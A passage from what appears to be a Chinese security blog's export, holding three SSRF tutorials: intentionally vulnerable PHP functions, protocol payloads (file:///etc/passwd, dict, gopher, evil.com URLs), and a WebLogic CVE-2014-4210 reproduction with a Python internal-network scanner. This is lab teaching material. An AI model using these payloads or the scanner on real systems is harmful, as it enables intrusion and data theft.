<h2 id="产生SSRF漏洞的函数（PHP）"><a href="#产生SSRF漏洞的函数（PHP）" class="headerlink" title="产生SSRF漏洞的函数（PHP）"></a>产生SSRF漏洞的函数（PHP）</h2><p>在PHP中如<code>fsockopen()</code>、<code>pfsockopen()</code>、<code>file_get_contents()</code>、<code>show_source()</code>、<code>highlight_file()</code>、<code>curl_exec()</code>、<code>curl_multi_exec()</code>、<code>fopen()</code>、<code>readfile()</code>、<code>mysqli_connect()</code>、<code>include()</code>、<code>require()</code>、<code>file()</code>、<code>copy()</code>等函数使用过程中没有很好的对参数进行限制就可能导致SSRF漏洞。可以在php.net中搜索网络请求、套接字建立、数据库链接、文件操作相关的函数，部分函数使用的示例代码如下，代码审计时可根据关键字搜索函数进行分析。</p>
<h3 id="file-get-contents函数"><a href="#file-get-contents函数" class="headerlink" title="file_get_contents函数"></a>file_get_contents函数</h3><p><code>file_get_contents()</code>函数把整个文件读入一个字符串中。</p>
<p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$content</span>=file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上代码是获取post参数url中的值地址，通过<code>file_get_contents</code>获取url中的图片内容，保存到image目录下，然后显示。</p>
<p><code>file_get_contents</code>函数使用前需要将<code>php.ini</code>的<code>allow_url_fopen</code>设置为ON。</p>
<p>以上的漏洞代码是存在SSRF漏洞的，可以控制url参数，自定义任意的URL，包括内网的URL，例如现在验证内网192.168.123.66是否开启了6379端口，可以做以下访问：</p>
<p><img src="https://i.loli.net/2021/11/23/qQFje89rYgda27u.png" alt="image-20211123221432540"></p>
<p>根据上图的报错信息可以看出开启了6379，接下来测试是否开启了7777端口</p>
<p><img src="https://i.loli.net/2021/11/23/qHsZU27dcnpr5FX.png" alt="image-20211123221814006"></p>
<p>测试7777端口时，根据上图提示，显示错误信息，说明端口未开放。接下来测试80端口，看显示结果（因为80端口是开放的，所以测试下，看回显内容）</p>
<p><img src="https://i.loli.net/2021/11/23/T7ZWbElt2U61ed9.png" alt="image-20211123221034055"></p>
<p>访问80端口并未报错，此时，查看图片内容（选中图片，点复制链接），如下图：</p>
<p><img src="https://i.loli.net/2021/11/23/cxi7ed9XMVQaFU5.png" alt="image-20211123221258165"></p>
<p>发现请求的80端口的数据被写入到了图片问题中，符合代码预期。除了可以探测端口，也可以做文件包含漏洞的利用，这里不再细说文件包含的知识。</p>
<h3 id="fsockopen函数"><a href="#fsockopen函数" class="headerlink" title="fsockopen函数"></a>fsockopen函数</h3><p><code>fsockopen()</code>函数用来打开一个网络连接或者一个Unix套接字连接。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line">    <span class="comment"># fsockopen(主机名称，端口号码，错误号的接受变量，错误提示的接受变量，超时时间)</span></span><br><span class="line">    <span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">        <span class="comment"># fwrite() 函数将内容写入一个打开的文件中。</span></span><br><span class="line">        fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">        <span class="comment"># 函数检测是否已到达文件末尾 ,文件末尾（EOF）</span></span><br><span class="line">        <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上函数是接受url和port来制定socket访问的地址和端口，由于地址和端口用户可控，所以可以用来SSRF漏洞的利用。</p>
<p>例如可以做以下访问可以探测192.168.123.66的3306端口是否开放：</p>
<p><img src="https://i.loli.net/2021/11/25/x5ywzhplXHYEJG8.png" alt="image-20211125224116389"></p>
<p>做以下访问可以探测192.168.123.188的3306是否开放：</p>
<p><img src="https://i.loli.net/2021/11/25/F6Yf4yAHVj2TprJ.png" alt="image-20211125224304557"></p>
<p>未出现错误信息说明端口开放</p>
<h3 id="curl-exec函数"><a href="#curl-exec函数" class="headerlink" title="curl_exec函数"></a>curl_exec函数</h3><p><code>curl_exec</code>函数执行给定的cURL会话。这个函数应该在初始化一个cURL会话并且全部的选项都被设置后被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>curl_exec函数是危害最大的函数，也是需要重点讲的函数。以上代码是获取参数url的值，使用curl进行访问。</p>
<p>curl_exec的使用需要3个条件：</p>
<ul>
<li>PHP版本&gt;=5.3</li>
<li>开启extension=php_curl.dll</li>
<li>—wite-curlwrappers（编译PHP时用，此时不需要，可忽略）</li>
</ul>
<p>使用dict协议探测80端口（后面会讲dict协议）</p>
<p><img src="https://i.loli.net/2021/11/25/VbLU7w5WSxghmse.png" alt="image-20211125225544944"></p>
<p>使用dict协议探测6379端口</p>
<p><img src="https://i.loli.net/2021/11/25/7Lq8jTesEQlKNnk.png" alt="image-20211125225659371"></p>
<p>可以根据回显的banner信息判断目标端口运行的服务为http和redis服务，dict协议还可以做到执行命令的功能，之后再进行讲解。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/116039804">SSRF服务器端请求伪造漏洞基础 - 知乎 (zhihu.com)</a></li>
<li><a href="https://xz.aliyun.com/t/2115">了解SSRF,这一篇就足够了 - 先知社区 (aliyun.com)</a></li>
<li><a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf">papers/build_your_ssrf_exp_autowork—20160711.pdf at master · ring04h/papers (github.com)</a></li>
<li><a href="https://www.runoob.com/php/php-ref-curl.html">PHP cURL 函数 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/">SSRF漏洞基础 | Yang Hao’s blog (yanghaoi.github.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF服务端请求伪造</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF的利用协议</title>
    <url>/post/afbbea8e.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>测试漏洞源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"> <span class="variable">$curlobj</span> = curl_init(<span class="variable">$url</span>);</span><br><span class="line"> <span class="keyword">echo</span> curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h2><p>file协议主要用于访问本地计算机中的文件。</p>
<p>协议格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">file://文件路径</span><br></pre></td></tr></table></figure>
<h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p>读取linux本地文件（<code>?url=file:///etc/passwd</code>）</p>
<p><img src="https://i.loli.net/2021/11/27/xYtH6q9WpUFT7lm.png" alt="image-20211127155243529"></p>
<p>读取Windows本地文件（<code>?url=file://C://Windows//System32//drivers//etc//hosts</code>)</p>
<p><img src="https://i.loli.net/2021/11/27/P3zFK6MyGN14Ixs.png" alt="image-20211127155344052"></p>
<h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><p>词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。</p>
<p>协议格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">dict://服务端ip:端口/命令:参数</span><br></pre></td></tr></table></figure>
<h3 id="端口服务探测"><a href="#端口服务探测" class="headerlink" title="端口服务探测"></a>端口服务探测</h3><p>探测22端口是否开放与返回的banner信息（<code>?url=dict://192.168.123.66:22</code>）</p>
<p><img src="https://i.loli.net/2021/11/27/iEqLQTFM2wN6jY3.png" alt="image-20211127162403080"></p>
<p>探测6379端口是否开放与返回的banner信息（<code>?url=dict:///192.168.123.66:6379/info</code>）</p>
<p><img src="https://i.loli.net/2021/11/27/H1R4eghuDyBECOM.png" alt="image-20211127162609600"></p>
<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>Gopher是一个互联网上使用的分布型的文件搜集获取网络协议。Gopher最初的设计目标与万维网类似：共享文档，今天的万维网几乎已经替代了Gopher。但Gopher协议还提供了一些万维网先天缺乏的功能，比如在Gopher中所有信息都以层级形式存储，这被认为是存储大量信息的最好方式之一。 </p>
<blockquote>
<p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
</blockquote>
<p><strong>限制</strong>：gopher协议在各个编程语言中的使用限制</p>
<p><img src="https://i.loli.net/2021/11/27/PTD7G8k4UwyKbsq.png" alt="img"></p>
<blockquote>
<p>—wite-curlwrappers：运用curl工具打开url流</p>
<p>curl使用curl —version查看版本以及支持的协议</p>
<p><img src="https://i.loli.net/2021/11/27/7uZCsPngl4W9O8r.png" alt="image-20211127171138943"></p>
</blockquote>
<p>协议格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">dict://服务端ip:端口/_&#123;TCP/IP数据流&#125;</span><br></pre></td></tr></table></figure>
<p>开始的<code>_</code>字符可以由任意字符替代，数据流使用URL编码。</p>
<ul>
<li>gopher的默认端口是70</li>
<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
</ul>
<h3 id="发送HTTP-GET请求"><a href="#发送HTTP-GET请求" class="headerlink" title="发送HTTP GET请求"></a>发送HTTP GET请求</h3><p>首先我们了解一下curl发送gopher请求的过程：</p>
<p>主机A：nc启动监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lp 2333</span><br></pre></td></tr></table></figure>
<p>主机B：curl发送gopher请求</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.123.66/_abc123</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/27/VGQWXoer48EJPUY.png" alt="image-20211127173443407"></p>
<p>可以看到此时主机A收到的消息为abc123</p>
<p>那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：</p>
<ol>
<li>构造HTTP数据包</li>
<li>URL编码、替换回车换行为%0d%0a</li>
<li>发送gopher协议</li>
</ol>
<p>利用SSRF发送gopher协议请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com/mylabs/ssrf/curl_exec.php?url=gopher://192.168.123.66:2333/_abc123</span><br></pre></td></tr></table></figure>
<p>可以看到nc接收到了消息，没有问题。</p>
<p><img src="https://i.loli.net/2021/11/27/I96ke37CYpT1XUR.png" alt="image-20211127204015043"></p>
<p>我准备了一个PHP的代码，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一个GET型的HTTP包，如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get.php?name=Ulysses</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">HOST</span><span class="punctuation">: </span>192.168.123.66</span><br></pre></td></tr></table></figure>
<p>URL编码后为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.123.66:80/_GET%20/get.php%3fname=Ulysses%20HTTP/1.1%0d%0aHOST:%20192.168.123.66%0d%0a</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/27/uaz3o71ImShyNj6.png" alt="image-20211127203007325"></p>
<blockquote>
<p>在URL编码中需要注意如下几点：</p>
<ul>
<li>问号（?）需要转码为URL编码，也就是%3f</li>
<li>回车换行要变为%0d%0a，但如果直接用工具转换，可能只会有%0a</li>
<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
</ul>
</blockquote>
<h3 id="发送HTTP-POST请求"><a href="#发送HTTP-POST请求" class="headerlink" title="发送HTTP POST请求"></a>发送HTTP POST请求</h3><p>post.php的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发送POST请求前，先看下POST数据包的格式</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">HOST</span><span class="punctuation">: </span>hackroom.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12</span><br><span class="line"></span><br><span class="line"><span class="ini"><span class="attr">name</span>=Ulysses</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：<code>Content-Type</code>和<code>Content-Length</code>为查找POST请求中所需的字段，如果不叫则会报500错误</p>
</blockquote>
<p>现在我们将它进行URL编码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.123.66:80/_POST%20/post.php%20HTTP/1.1%0d%0aHOST:%20192.168.123.66%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2012%0d%0a%0d%0aname=Ulysses%0d%0a</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/27/x9n7j1NBXqfGQC2.png" alt="image-20211127203120446"></p>
<h2 id="ftp、sftp、tftp协议"><a href="#ftp、sftp、tftp协议" class="headerlink" title="ftp、sftp、tftp协议"></a>ftp、sftp、tftp协议</h2><p>FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。FTP 协议包括两个组成部分，其一为 FTP 服务器，其二为 FTP 客户端。其中 FTP 服务器用来存储文件，用户可以使用 FTP 客户端通过 FTP 协议访问位于 FTP 服务器上的资源。在开发网站的时候，通常利用 FTP 协议把网页或程序传到 Web 服务器上。此外，由于 FTP 传输效率非常高，在网络上传输大的文件时，一般也采用该协议。</p>
<p>Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ftp://evil.com:1337/</span><br><span class="line"></span><br><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line"></span><br><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里仅做简单介绍</p>
</blockquote>
<h2 id="ldap、ldaps、ldapi协议"><a href="#ldap、ldaps、ldapi协议" class="headerlink" title="ldap、ldaps、ldapi协议"></a>ldap、ldaps、ldapi协议</h2><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</span><br><span class="line"></span><br><span class="line">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</span><br><span class="line"></span><br><span class="line">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里仅做简单介绍</p>
</blockquote>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/115222529">SSRF漏洞中使用到的其他协议（附视频+Py） - 知乎 (zhihu.com)</a></li>
<li><a href="https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/#toc-heading-12">SSRF漏洞基础 | Yang Hao’s blog (yanghaoi.github.io)</a></li>
<li><a href="https://nosec.org/home/detail/2167.html">深入浅出SSRF，Part-1|NOSEC安全讯息平台 - 白帽汇安全研究院</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF服务端请求伪造</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>利用SSRF渗透内网主机·上</title>
    <url>/post/49deb66d.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="利用WebLogic的SSRF漏洞探测内网信息"><a href="#利用WebLogic的SSRF漏洞探测内网信息" class="headerlink" title="利用WebLogic的SSRF漏洞探测内网信息"></a>利用WebLogic的SSRF漏洞探测内网信息</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<p><strong>CVE编号</strong>：CVE-2014-4210</p>
<p><strong>影响范围</strong>：</p>
<ul>
<li><p>Oracle WebLogic Server 10.3.6.0</p>
</li>
<li><p>Oracle WebLogic Server 10.0.2.0</p>
</li>
</ul>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载vulhub：<code>git clone https://github.com/vulhub/vulhub.git</code></p>
<p>进入目录：<code>cd vulhub/weblogic/ssrf/</code></p>
<p>启动环境：<code>docker-compose up -d</code></p>
<p>访问：<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<p>出现以下页面，说明测试环境ok。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>开启Burp代理，提交表单</p>
<p><img src="https://i.loli.net/2021/11/27/wFfo9vic2SPYOje.png" alt="image-20211127214445369"></p>
<p>从返回页面的结果的报错上看，当提交表单的时候会访问下面这个URL，并做XMLSoap解析，这个错误就是我们SSRF漏洞产生的关键点</p>
<p><img src="https://i.loli.net/2021/11/27/4YJZTd1WI3F9vSw.png" alt="image-20211127215236521"></p>
<p>为了验证是否存在SSRF漏洞，我们将operator的值改为DNSLog生成的记录</p>
<p><img src="https://i.loli.net/2021/11/27/qdfXEuGQ3yAVBmC.png" alt="image-20211127220322683"></p>
<p>在DNSLog中可以看到请求的内容，说明存在SSRF漏洞</p>
<p><img src="https://i.loli.net/2021/11/27/ZARPe1ptTb6v53o.png" alt="image-20211127220355011" style="zoom:67%;"></p>
<h3 id="探测内网存活IP"><a href="#探测内网存活IP" class="headerlink" title="探测内网存活IP"></a>探测内网存活IP</h3><p>若ip不存在时返回如下信息（会一直请求该地址，直到超时）</p>
<p><img src="https://i.loli.net/2021/11/27/qbjvMVsPzw1GuHB.png" alt="image-20211127233025326"></p>
<p>若ip存在则返回如下信息</p>
<p><img src="https://i.loli.net/2021/11/27/voYck5Z4xFa31BX.png" alt="image-20211127223539057"></p>
<h3 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h3><p>若端口不开放返回如下信息</p>
<p><img src="https://i.loli.net/2021/11/27/qtFkUVnRrD5wzS9.png" alt="image-20211127233755211"></p>
<p>若端口开放返回如下信息（分两种情况）</p>
<p>若开放的端口为非Web端口</p>
<p><img src="https://i.loli.net/2021/11/27/XnKvG9qkyabhPMz.png" alt="image-20211127224151445"></p>
<p>若开放的端口为Web端口（还分为请求类型是否为text/html）</p>
<p>text/html类型</p>
<p><img src="https://i.loli.net/2021/11/27/muyTHXfCWV93lva.png" alt="image-20211127224433070"></p>
<p>非text/html类型</p>
<p><img src="https://i.loli.net/2021/11/27/GFS3PvNpMyTVcbD.png" alt="image-20211127224519722"></p>
<p>我们可以利用返回信息来进行内网探测</p>
<h3 id="内网探测脚本编写"><a href="#内网探测脚本编写" class="headerlink" title="内网探测脚本编写"></a>内网探测脚本编写</h3><p>编写一个python脚本自动化探测内网的存活主机ip与开放端口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># 功能：扫描内网开放ip及端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        final_ip = <span class="string">&#x27;&#123;ip&#125;.&#123;i&#125;&#x27;</span>.<span class="built_in">format</span>(ip=ip, i=i)</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">final_ip</span>):</span></span><br><span class="line">    ports = (<span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;23&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;135&#x27;</span>, <span class="string">&#x27;139&#x27;</span>, <span class="string">&#x27;443&#x27;</span>, <span class="string">&#x27;445&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>, <span class="string">&#x27;1433&#x27;</span>, <span class="string">&#x27;1521&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>, <span class="string">&#x27;3389&#x27;</span>, <span class="string">&#x27;6379&#x27;</span>, <span class="string">&#x27;4899&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>, <span class="string">&#x27;7001&#x27;</span>, <span class="string">&#x27;8000&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = args.url + <span class="string">&#x27;/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&#x27;</span> % (final_ip, port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="literal">False</span>) </span><br><span class="line">            result0 = re.findall(<span class="string">&#x27;weblogic.uddi.client.structures.exception.XML_SoapException&#x27;</span>, r.content)</span><br><span class="line">            result1 = re.findall(<span class="string">&#x27;route to host&#x27;</span>, r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">&#x27;but could not connect&#x27;</span>, r.content)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(result0) != <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(result1) == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(result2) == <span class="number">0</span>:</span><br><span class="line">                out = <span class="string">&quot;port exist: &quot;</span> + final_ip + <span class="string">&#x27;:&#x27;</span> + port</span><br><span class="line">                <span class="built_in">print</span> out        </span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span>():</span></span><br><span class="line">    vul_url = args.url + <span class="string">&#x27;/uddiexplorer/SetupUDDIExplorer.jsp&#x27;</span></span><br><span class="line">    r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&quot;For example: http://\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\ b&quot;</span>)</span><br><span class="line">    result1 = reg.findall(r.content)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> result1:</span><br><span class="line">        result = result1[<span class="number">0</span>].replace(<span class="string">&quot;For example: http://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Weblogic SSRF vulnerable exploit&#x27;</span>) </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, dest=<span class="string">&#x27;url&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target url&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--ip&#x27;</span>, dest=<span class="string">&#x27;scan_ip&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;IP to scan&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    ip = <span class="string">&#x27;.&#x27;</span>.join(args.scan_ip.split(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    <span class="comment">#print ip</span></span><br><span class="line">    <span class="comment">#ip = get_ip()</span></span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;no ip&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/27/Ste6K1kMXgaRHNl.png" alt="image-20211127234237632"></p>
